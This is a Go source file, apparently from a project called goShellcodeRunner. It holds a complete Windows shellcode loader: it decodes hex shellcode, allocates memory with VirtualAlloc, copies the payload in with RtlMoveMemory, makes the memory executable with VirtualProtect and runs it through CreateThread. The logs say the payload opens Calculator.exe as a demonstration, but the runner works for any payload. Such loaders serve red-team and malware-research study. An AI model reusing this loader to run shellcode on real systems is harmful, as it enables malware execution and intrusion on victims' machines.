package shellcode

import (
	"encoding/hex"
	dll "goShellcodeRunner/DLL"
	"log"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func ExecuteCalculator() {

	log.Print("[SHELL] Shellcode (Calculator.exe) Starts Running... \n")

	shellAddr, shellSrc := AllocateShellcode()

	CopyShellcodeToMemory(shellAddr, shellSrc)

	ChangeShellcodeMemoryToRX(&shellAddr, len(shellSrc))

	tHandle := CreateThread(shellAddr)

	RunShellcode(&tHandle)
	log.Print("[SHELL] Shellcode Executed Successfully\n")
}

func AllocateShellcode() (uintptr, []byte) {
	shellCodeSrc, _ := hex.DecodeString(HexShellcode)

	shellAddr, err := windows.VirtualAlloc(
		uintptr(0),
		uintptr(len(shellCodeSrc)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		syscall.PAGE_READWRITE)
	// syscall.PAGE_EXECUTE_READWRITE)

	if err != nil {
		// The verb %v ('v' for 'value') always formats the argument in its default form,
		// The special verb %T ('T' for 'Type') prints the type of the argument rather than its value.
		log.Panicf("[-] Shellcode Virtual Memory Allocation  Failed! %v \n", err)
	}

	log.Printf("[+] Allocation Memory Addr Done 0x[%v] \n", shellAddr)
	return shellAddr, shellCodeSrc
}

func CopyShellcodeToMemory(destAddr uintptr, shellCodeSrc []byte) {
	//RtlMoveMemory is for local process memory (not cross-process).
	procRtlMoveMemory := dll.NtDll.NewProc("RtlMoveMemory")

	procRtlMoveMemory.Call(
		destAddr,
		uintptr(unsafe.Pointer(&(shellCodeSrc)[0])),
		uintptr(len(shellCodeSrc)))

	log.Printf("[+] Shellcode Wrote Done 0x[%v] \n", destAddr)
}

func ChangeShellcodeMemoryToRX(shellcodeAddr *uintptr, shellCodeSrcLen int) {
	log.Printf("[ ] Changing Shellcode Memory Address Permission To R-X \n")
	var oldProtect uint32
	err := windows.VirtualProtect(*shellcodeAddr,
		uintptr(shellCodeSrcLen),
		syscall.PAGE_EXECUTE_READ,
		&oldProtect)
	if err != nil {

		log.Panicf("[-] Change Shellcode Virtual Memory Permission To R-X Failed! %v \n", err)
	}
	log.Printf("[+] Shellcode Memory Permissions Changed To R-X \n")
}

func CreateThread(shellAddr uintptr) uintptr {

	procCreateThread := dll.Kernel32.NewProc("CreateThread")

	tHandle, _, lastErr := procCreateThread.Call(
		uintptr(0),
		uintptr(0),
		shellAddr,
		uintptr(0),
		uintptr(0),
		uintptr(0))

	if tHandle == 0 {
		log.Panicf("[-] Error While Creating Thread %v \n", lastErr)
	}
	log.Printf("[+] Handle Of New Created Thread (%v) \n", tHandle)

	return tHandle
}

func RunShellcode(tHandle *uintptr) {
	log.Printf("[ ] Waiting For Thread To Execute Shellcode...Handle (%v)  \n", *tHandle)
	windows.WaitForSingleObject(windows.Handle(*tHandle), 3000)
	// 300 = dwMilliseconds (wait time)
	// Without using WaitForSingleObject, the main program might terminate immediately after the new thread is created
	// and the shellcode might not be fully executed. This function prevents this problem by pausing the main program
	// until the thread completes.
}
